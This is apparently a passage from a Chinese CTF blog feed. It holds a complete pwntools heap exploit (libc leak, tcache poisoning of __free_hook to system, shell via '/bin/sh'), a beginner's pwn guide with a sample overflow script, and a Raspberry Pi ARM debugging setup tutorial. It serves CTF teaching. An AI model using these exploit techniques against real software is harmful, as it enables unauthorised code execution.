class="string">&quot;./realNoOutput&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,27832)</span></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line"><span class="comment">#one_gadget=[0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./realNoOutput&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,29826)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn入门指南</title>
      <link href="/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这篇是因为学校社团招新需要给学弟学妹每个方向的大致印象，发展方向，当然我也希望这篇文章可以帮助到更多的人。接下来我会介绍一下入门pwn需要准备一些什么，学习一些什么，希望这些不成熟的意见可以帮助到刚开始入门pwn的你。由于篇幅有限，这里不会详细介绍各个知识点，更多的是一些链接，不涉及具体内容，只是帮你找到你应该学什么，推荐一些学习资源。</p><h1 id="书籍推荐"><a href="#书籍推荐" class="headerlink" title="书籍推荐"></a>书籍推荐</h1><p>这里推荐一些适合刚刚准备入门pwn方向的书籍，所以这里并没有列出一些pwn方向很重要，但不是新手需要的书籍。</p><h2 id="《程序员的自我修养：链接装载与库》"><a href="#《程序员的自我修养：链接装载与库》" class="headerlink" title="《程序员的自我修养：链接装载与库》"></a>《程序员的自我修养：链接装载与库》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/1b4c510fd9f9d72a95616a43df2a2834349bbb63" alt="程序员的自我修养"></p><p>这本书是对pwn入门来说非常非常有用的一本书，可以说是一本必读的书，能让你更清楚的了解很多pwn知识点背后的逻辑。可以说是必读的书了。</p><h2 id="《CTF竞赛权威指南（Pwn篇）》"><a href="#《CTF竞赛权威指南（Pwn篇）》" class="headerlink" title="《CTF竞赛权威指南（Pwn篇）》"></a>《CTF竞赛权威指南（Pwn篇）》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/0b55b319ebc4b74543a9b3057cb609178a82b901bfc4" alt="ctf权威指南"></p><p>书中涵盖了pwn各个方向的知识点，虽说很多最新的知识点该书不能提供，但是作为入门数据，这本书的知识点起码够你学大半年了。比市面上其他ctf入门书籍更加适合pwn手，强烈推荐。</p><h2 id="《深入理解计算机系统（又名CSAPP）》"><a href="#《深入理解计算机系统（又名CSAPP）》" class="headerlink" title="《深入理解计算机系统（又名CSAPP）》"></a>《深入理解计算机系统（又名CSAPP）》</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/s29195878.jpg" alt="csapp"></p><p>这是一本很厚重的书，虽说没有像上面两本书那么直接对pwn做题有直接帮助，但是这本书一定是pwn方向，不不不，它可以说是所有计算机方向必读书籍了，对你长期成长来说肯定有帮助，希望在闲暇时间去读一读。</p><h1 id="网站以及入门视频推荐"><a href="#网站以及入门视频推荐" class="headerlink" title="网站以及入门视频推荐"></a>网站以及入门视频推荐</h1><p>刷题网站和ctfwiki这里就不做过多的赘述了，这里提供一些适合新人pwn方向独有的平台，和自己觉得不错的入门视频</p><h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719104848925.png" alt="pwnable.kr"></p><p>网址：<a href="https://pwnable.kr/">https://pwnable.kr/</a></p><p>这个平台的漏洞虽然和我们国内比赛主流方向的关系不是很大，但是里面有很多可以学习的知识点，还是很推荐大家做一做的，很多题目比较适合新手。</p><h2 id="XMCVE-2020-CTF-Pwn入门课程"><a href="#XMCVE-2020-CTF-Pwn入门课程" class="headerlink" title="XMCVE 2020 CTF Pwn入门课程"></a>XMCVE 2020 CTF Pwn入门课程</h2><p>网址：<a href="https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web">https://www.bilibili.com/video/BV1854y1y7Ro?share_source=copy_web</a></p><p>这部视频可以说是全b站最为详细的pwn入门视频了，细节抓的很清楚，缺点就是过于详实，可能会让你缺少一份自己的思考，视频时间也过长，需要耐心观看</p><h2 id="2020暑期Lilac-pwn入门培训"><a href="#2020暑期Lilac-pwn入门培训" class="headerlink" title="2020暑期Lilac-pwn入门培训"></a>2020暑期Lilac-pwn入门培训</h2><p>网址：<a href="https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web">https://www.bilibili.com/video/BV1Dt4y1D7mK?share_source=copy_web</a></p><p>这部视频其实是我入门时观看的视频，个人感觉讲解的很充分了，适合想要快速入门开始刷题的师傅们，其实从博客和题目中学习也是一种比较有效的方法</p><h1 id="pwn入门需要的基础知识"><a href="#pwn入门需要的基础知识" class="headerlink" title="pwn入门需要的基础知识"></a>pwn入门需要的基础知识</h1><h2 id="掌握c语言"><a href="#掌握c语言" class="headerlink" title="掌握c语言"></a>掌握c语言</h2><p>想要学习pwn首先就要学习c语言，这是最最最基础的工作，如果没有学习过c语言，可能连题目都看不懂。</p><p>推荐翁恺老师的c语言课程：<a href="https://www.icourse163.org/course/ZJU-9001?from=searchPage">https://www.icourse163.org/course/ZJU-9001?from=searchPage</a></p><h2 id="学习汇编"><a href="#学习汇编" class="headerlink" title="学习汇编"></a>学习汇编</h2><p>学习pwn还是要懂汇编语言的，起码先学习x86/x64下的汇编语言，学好汇编会让你开始的路走的很轻松，可以先学习8060的汇编，推荐王爽老师的《汇编语言》</p><h2 id="使用ida"><a href="#使用ida" class="headerlink" title="使用ida"></a>使用ida</h2><p>ida是一个非常好用的静态分析工具，可以说是一个神器，她会帮助你非常轻松的分析出题目的逻辑，基本是必须会使用的工具。你会发现ida的图标是一个女性，其实这是第一位程序员，她的名字就叫ida。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210719111139804.png" alt="image-20210719111139804"></p><p>推荐一篇博客：<a href="https://xz.aliyun.com/t/4205%EF%BC%8C%E8%BF%99%E9%87%8C%E6%9C%89%E8%AF%A6%E7%BB%86%E7%9A%84%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">https://xz.aliyun.com/t/4205，这里有详细的使用教程</a></p><h2 id="使用pwndbg"><a href="#使用pwndbg" class="headerlink" title="使用pwndbg"></a>使用pwndbg</h2><p>这其实是一个gdb的调试插件，这个工具可以帮助你更好的进行动态分析。关于工具的安装可以看我的另一篇博客，虽然是针对arm架构的树莓派的，但对于x64的ubuntu也适用。</p><p>安装：<a href="https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">https://kr0emer.com/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/#pwn%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</a></p><h2 id="使用pwntools"><a href="#使用pwntools" class="headerlink" title="使用pwntools"></a>使用pwntools</h2><p>pwnatools的安装上面的链接中也有，这是一个编写python交互的库，是pwn入门必备的工具。</p><p>编写脚本类似这样：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">44908</span>)</span><br><span class="line">sh_addr=<span class="number">0x0804868B</span></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">24</span>+p32(sh_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">262</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;your username:&quot;</span>,<span class="string">&#x27;kreomer&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;your passwd:&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>官方教程：<a href="https://docs.pwntools.com/en/latest/">https://docs.pwntools.com/en/latest/</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>pwn入门的基础基本就是以上这些，想要了解具体的攻击方法可以通过以上书籍、视频或者借助ctfwiki来学习（<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/%EF%BC%89%EF%BC%8C%E7%94%B1%E4%BA%8E%E5%8F%AA%E6%98%AF%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%8C%87%E5%8D%97%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E6%B6%89%E5%8F%8A%E5%85%B7%E4%BD%93%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E3%80%82%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8A%E6%8F%90%E4%BE%9B%E7%9A%84%E9%93%BE%E6%8E%A5%E8%BF%9B%E8%A1%8C%E5%AD%A6%E4%B9%A0%E3%80%82">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/），由于只是一个简单的指南，这里不涉及具体漏洞的攻击方法。可以通过以上提供的链接进行学习。</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用树莓派实现arm架构下的heap调试</title>
      <link href="/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/"/>
      <url>/2021/07/16/%E5%88%A9%E7%94%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%9E%E7%8E%B0arm%E6%A1%86%E6%9E%B6%E4%B8%8B%E7%9A%84heap%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一切的开始"><a href="#一切的开始" class="headerlink" title="一切的开始"></a>一切的开始</h1><p>​    在最近半年多的比赛中总是可以看到很多都涉及arm架构，比如：红明谷，虎符，国赛等大大小小的比赛都涉及了关于arm架构的题目。常规的做法是搭建<strong>quem</strong>虚拟机，然后使用<strong>gdbserver</strong>远程调试，来达到调试目的，当然也可以再用<strong>patchelf</strong>改一下动态链接库，使用<strong>python脚本</strong>交互。但是这样调试起来会发现没有调试，这种情况下当然也可以通过查看内存分布来进行调试。<strong>缺少了调试符调试起来感觉太麻烦了，也不够直观</strong>。当时的第一反应是下载<strong>带调试符的libc</strong>，当我找到对应版本的带有<strong>.debug</strong>文件的libc文件，使用patchelf将其和我们的binary绑定，同样使用quem来进行调试，可是这样依旧是显示没有调试符。而且看之前大师傅的博客说quem会存在一些奇奇怪怪的bug，就想是否可以直接使用arm架构的<strong>树莓派</strong>来搭建环境，调试arm下的题目。网上我查了好久也没找到类似的文章，就只能自己来试试了，顺便写出来分享给大家我的拙见，如果对你有帮助就太好了，也乘此机会搭建起来自己的博客，这就是我写这篇文章的开始，也是我博客的开始。</p><h1 id="树莓派的选择和ubuntu镜像烧录"><a href="#树莓派的选择和ubuntu镜像烧录" class="headerlink" title="树莓派的选择和ubuntu镜像烧录"></a>树莓派的选择和ubuntu镜像烧录</h1><h2 id="树莓派以及其他硬件的选择"><a href="#树莓派以及其他硬件的选择" class="headerlink" title="树莓派以及其他硬件的选择"></a>树莓派以及其他硬件的选择</h2><p>​    树莓派我选择的是<em>Raspberry Pi 4</em>，内存大小4GB，感觉就调试arm题目的话性能有点溢出，因为不使用桌面，所以内存可以选小一点，没必要选择这么大的内存，当然一切随你喜好。貌似还有香橙派，我不知道怎么样，有兴趣可以尝试，不保证可以搭配后面的流程，但其<strong>价格</strong>确实可爱的多。</p><p>​    树莓派使用的是<strong>tf</strong>卡，我觉得没必要买太大容量的，我环境完全搭建完成后也没有用太大的容量，同样是因为不需要桌面的原因。我们可以选择<strong>16GB</strong>的，这个容量应该是足够了。配套的需要一个一个<strong>读卡器</strong>来烧录镜像。</p><p>​    电源是<strong>5.1v=3.0A</strong>的，<strong>type-c</strong>接口，可以考虑使用手机充电器，但是最好还是买一个充电器比较好，这样比较方便。也可以考虑官方的充电器，就是有点小贵。</p><p>​    顺便一提，最好买个“机箱”，这样能保护好电路板，方便携带，同时要做好散热工作，散热片是要的，也可以使用一个小风扇。类似下图</p><p>​    <img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210716193707410.png" alt="树莓派机箱和风扇"></p><p>​    这里可能还需要使用显示屏和键盘，当然只有第一次搭建的时候需要使用，ubuntu官方文档中说可以不需要，但是我尝试了有一整天，并不能达到我想要的效果，这里放在后面环境搭建的时候再说。树莓派的视频接口是<strong>Micro</strong>，所以你需要有一头是Micro的视频传输线，也可以使用转换接口，我使用的就是转换接口，毕竟只用这一次，没必要买太贵的，键盘和显示屏都是借用舍友的，这里感谢我的舍友。</p><p>​    硬件就是这些啦，准备好硬件后就可以进行烧录和启动我们的ubuntu系统啦</p><h2 id="ubuntu环境的烧录和启动"><a href="#ubuntu环境的烧录和启动" class="headerlink" title="ubuntu环境的烧录和启动"></a>ubuntu环境的烧录和启动</h2><p>​    这里提供一个链接指导我们的安装ubuntu镜像(<a href="https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview">https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview</a>),</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717084431014.png" alt="烧录工具"></p><p>​    这里有三个不同的选项根据你主机的操作系统选择合适的烧录。具体的烧录方法可以参考上面的链接，内容很详实。一定要仔细看上面的官方文档，不然可能会出现一些奇奇怪怪的问题。</p><p>​    关于树莓派的wifi链接这里有个大坑，官方文档是这样说的：</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717090334507.png" alt="官方文档截图"></p><p>​    </p><p>但是实际上这里如果没有显示屏和键盘的话无法重启进行重启，也就<strong>无法连接</strong>到wife，而且由于某些奇怪的原因这个<strong>配置文件</strong>还需要在开机后再次编写以保证格式，所以之前准备工作才说明需要显示屏和键盘，当然你也可以再尝试尝试，说不定就成功了，有时候挺玄学的。</p><p>这里我基本花了一天时间，大多数时间在无意义的修改配置文件，因为没有显示屏转换器，以为是配置文件格式问题，结果花了一天时间都没解决，等转换器到了使用显示器基本一会就解决了，只要你的配置文件格式保证，开机后设置密码，然后<strong>重启</strong>，重启以后<strong>等待一会</strong>基本就可以连接到wifi了，如果无法链接，检查一下配置文件</p><p><strong>注意：配置文件中冒号后面一定有换行或者空格，而且还要注意对齐</strong>。</p><h1 id="寻找树莓派IP以及ssh连接"><a href="#寻找树莓派IP以及ssh连接" class="headerlink" title="寻找树莓派IP以及ssh连接"></a>寻找树莓派IP以及ssh连接</h1><h2 id="寻找树莓派ip地址"><a href="#寻找树莓派ip地址" class="headerlink" title="寻找树莓派ip地址"></a>寻找树莓派ip地址</h2><p>官方文档给了一种寻找树莓派的方法，但是我尝试过后感觉并不是很有用，后来发现其mac地址和官方的有出入，假如你使用的是手机热点，并且你的手机热点可以显示ip地址最好不过了，如果是其他情况的话这里我推荐使用<strong>Nmap</strong>来进行扫描。</p><p>这里肯定先要保证你和树莓派在同一个wifi下，然后检查你本地的ip地址win操作系统下使用<code>ipconfig</code>查看本地IP地址</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717093955362.png" alt="查看本地ip"></p><p>可以看到<strong>ip</strong>地址是192.168.43.29,<strong>子网掩码</strong>是255.255.255.0，那么我们就要检查192.168.43.1/24这个网络下的存活的ip有哪些</p><p>使用<code>nmap -sP 192.168.43.1/24</code>命令我们可以看到</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717094520150.png" alt="寻找树莓派"></p><p>有两台存活主机，一台是我们主机，那么另一台就是我们的树莓派了，当然可以看到其mac地址后面也告诉我们这台主机是树莓派。这样我们就找到我们树莓派的ip是192.168.43.29。</p><h2 id="使用FInallshell进行连接"><a href="#使用FInallshell进行连接" class="headerlink" title="使用FInallshell进行连接"></a>使用FInallshell进行连接</h2><p>接下来我推荐使用Finalshell来建立连接。这个工具要比xshell好用好多了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095624945.png" alt="Finalshell"></p><p>首先点击这里打开连接管理器</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095715919.png" alt="连接管理器"></p><p>再点击这里新建ssh连接</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717095821208.png" alt="新建ssh连接"></p><p>以这样的格式填写即可。</p><p>然后就可以开始链接我们的树莓派啦，当然你肯定会觉得这个窗口不是很好看，背景挺碍眼的，这里其实可以<strong>关闭背景</strong>，鼠标右击可以看到下面有设置背景图片</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100427076.png" alt="设置背景图片"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717100719414.png" alt="配置配色字体以及关闭背景"></p><p>把启用图片的√打掉就好了，此时你还发现取消掉背景怎么还是蓝色的，别着急，看看这里还要配色栏，你有很多钟配色可以选择，最下面有字体大小选择，这样就可以选择合适的字体大小和配色啦（毕竟<em>皮肤和坐骑的搭配才是获胜的关键</em>，这样就可以舒舒服服的进行调试啦。</p><h1 id="pwn调试环境搭建"><a href="#pwn调试环境搭建" class="headerlink" title="pwn调试环境搭建"></a>pwn调试环境搭建</h1><p>接下来就可以正式开始我们的环境搭建了，这里才是痛苦的开始，在配置环境期间遇到了数不清的问题，这一部分仅供参考，实际安装的时候还是要记得多搜索，毕竟这里每个人遇到的情况都有可能不同。</p><h2 id="python2的pip安装和pwntools安装"><a href="#python2的pip安装和pwntools安装" class="headerlink" title="python2的pip安装和pwntools安装"></a>python2的pip安装和pwntools安装</h2><p>我们先来解决最困难的，也就是python2的pwntools安装，之前一直是直接使用pip连接并没有发现什么问题，但是这次却有些问题，不管怎么说先安装python2</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install python</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1</span><br></pre></td></tr></table></figure><p>这样就将python的默认为python2了，如下图</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717105912959.png" alt="python默认pthon2"></p><p>接下来是pip的安装，现在已经无法正常安装python2的pip了，只能采取一些其他的手法,先安装setup-tools，这里需要先安装打开zip文件的软件</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install unzip</span><br><span class="line">wget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip<span class="comment">#md5=74663b15117d9a2cc5295d76011e6fd1</span></span><br><span class="line">unzip setuptools-36.6.0.zip </span><br><span class="line"><span class="built_in">cd</span> setuptools-36.6.0</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>再安装pip</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure><p>查看pip版本<code>pip --version </code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113029446.png" alt="检查pip版本"></p><p>说明pip安装完成</p><p>接下来安装pwntools</p><p>安装pwntools之前还需要一些准备工作,</p><p>安装gcc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure><p>安装capstone</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt install make </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/aquynh/capstone</span><br><span class="line"><span class="built_in">cd</span> capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>安装pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools</span><br><span class="line"><span class="built_in">cd</span> pwntools</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>验证一下pwntools可用</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717113956081.png" alt="验证pwntools"></p><p>如果不出意外，这里pwntools就安装好了，<strong>不要尝试</strong>用pip安装，基本不可能安装成功的，如果有其他情况就多搜索吧，或者评论区问我，如果我知道怎么回事，会给你回复的。这里pwntools算是安装完成了如果有问题我还是推荐装python3的pwntools吧,可能哪一天python2就不能用了,不是吗,我在装32位arm的ubuntu环境的时候发现无论如何都搞不定,我已经绝望了,还是适应python3吧.</p><p>python3安装pwntools的话就简单多了</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">pip3 install --upgrade pwntools</span><br></pre></td></tr></table></figure><h2 id="pwndbg安装"><a href="#pwndbg安装" class="headerlink" title="pwndbg安装"></a>pwndbg安装</h2><p>使用下面命令来安装pwntools</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717121038336.png" alt="验证pwndbg安装"></p><p>这样就是安装成功啦</p><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>patchelf是我们用来改写文件ld和libc的这里推荐<em>patchelf_0.12</em></p><p><a href="https://github.com/NixOS/patchelf">https://github.com/NixOS/patchelf</a></p><p>github地址在这里里面有详细的教学，这里就不赘述啦</p><p>按照官方教程来就好了</p><h2 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc all in one"></a>glibc all in one</h2><p>这里还需要glibc all in one，虽然glibc all in one的下的库是x86下的，但是这个可以帮助我们很好的管理gliibc</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br></pre></td></tr></table></figure><p>使用上面语句进行下载</p><p>然后随便下载一个libc，形成文件夹</p><p>下载好后需要安装一个库,并形成文件夹</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chmod 777 -R glibc-all-in-one/</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br><span class="line">sudo pip install requests </span><br><span class="line">./update_list</span><br><span class="line">./download 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure><p>这样基本就完成了</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717131220453.png" 